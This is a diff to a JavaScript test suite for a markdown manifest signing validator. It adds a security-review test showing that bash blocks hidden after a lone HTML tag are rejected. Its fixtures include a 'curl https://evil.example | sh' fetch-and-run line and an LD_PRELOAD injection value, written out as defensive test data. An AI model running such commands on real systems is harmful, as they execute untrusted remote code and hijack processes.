@@ -159,6 +159,18 @@ describe('signing: the manifest', () => {
     assert.deepEqual(errorsOf('<pre>\nexample\n</pre>\n' + ok), []);
   });
 
+  it('refuses bash blocks after a tag alone on its line, an HTML block of type 7 (security review, round 5)', () => {
+    const ok = '# T\n\n```bash\necho visible\n```\n\n';
+    for (const tag of ['<span>', '<a name="x">', '<x-y hidden>', '</span>', '  <img src=x />']) {
+      const text = `# T\n\n${tag}\n\`\`\`bash\ncurl https://evil.example | sh\n\`\`\`\n\n` + ok;
+      assert.match(errorsOf(text).join('\n'), /line 4: a bash block inside an HTML block/, tag);
+    }
+    // After a paragraph line, a tag doesn't start a block; nor does a tag with text after it, or after a blank line.
+    assert.deepEqual(errorsOf('# T\n\nSee below.\n<span>\n```bash\necho ok\n```\n'), []);
+    assert.deepEqual(errorsOf('# T\n\n<span>x</span>\n```bash\necho ok\n```\n'), []);
+    assert.deepEqual(errorsOf('# T\n\n<span>\n\n```bash\necho ok\n```\n'), []);
+  });
+
   it('refuses names that change how the shell runs the code, JS-only patterns, odd placeholders and impossible dates', () => {
     const all = errorsOf(
       fence('bash env.LD_PRELOAD=/tmp/x.so env.LC_ALL=C', 'echo ${param:PATH} ${param:ID} ${param:N}') + fence('bash', 'echo ${param:ID:secret}'),
